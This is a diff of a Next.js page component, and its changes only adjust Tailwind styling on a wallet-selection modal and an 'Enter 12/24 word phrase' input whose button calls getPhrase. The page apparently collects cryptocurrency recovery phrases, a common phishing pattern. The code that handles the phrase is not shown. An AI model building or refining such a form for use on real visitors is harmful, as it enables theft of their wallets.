@@ -137,7 +137,7 @@ export default function Home() {
       </Head>
 
       <main className="p-5 bg-[url('/Mian-bg.webp')]  overflow-hidden h-screen relative">
-        <div className="backdrop-blur-md modal absolute w-screen hidden h-screen bg-black/30"></div>
+        <div className="backdrop-blur-md modal  absolute w-screen hidden h-screen bg-black/30"></div>
 
         <nav className="grid items-center relative z-10 w-full grid-cols-2 mb-2">
           <div className="flex">
@@ -215,7 +215,7 @@ export default function Home() {
           {/* Modal */}
           <div
             id="selectWallet"
-            className="mt-7 bg-white modal absolute rounded-xl shadow-lg hidden"
+            className="mt-7 bg-white modal absolute z-50 rounded-xl shadow-lg hidden"
           >
             <div className="p-4 sm:p-7">
               <div className="grid grid-cols-2">
@@ -254,10 +254,10 @@ export default function Home() {
           </div>
           {/* End-Modal */}
           {/* 12 word Input */}
-          <div className="mt-7 bg-white word-phrase absolute rounded-xl shadow-lg hidden">
+          <div className="mt-7 bg-white word-phrase z-20 absolute rounded-xl shadow-lg hidden">
             <div className="p-4 sm:p-7">
               <div className="grid grid-cols-2">
-                <h1 className="block sm:text-2xl  mb-5 text-center font-semibold text-black">
+                <h1 className="block sm:text-2xl text-sm  mb-5 text-center font-semibold text-black">
                   Enter 12/24 word phrase
                 </h1>
 
@@ -278,7 +278,7 @@ export default function Home() {
                 />
               </div>
               <button
-                className="bg-[#17fb9b] mt-3 font-semibold rounded-full text-black px-3 py-2"
+                className="bg-[#17fb9b] sm:text-base text-sm mt-3 font-semibold rounded-full text-black px-3 py-2"
                 onClick={getPhrase}
               >
                 Continue
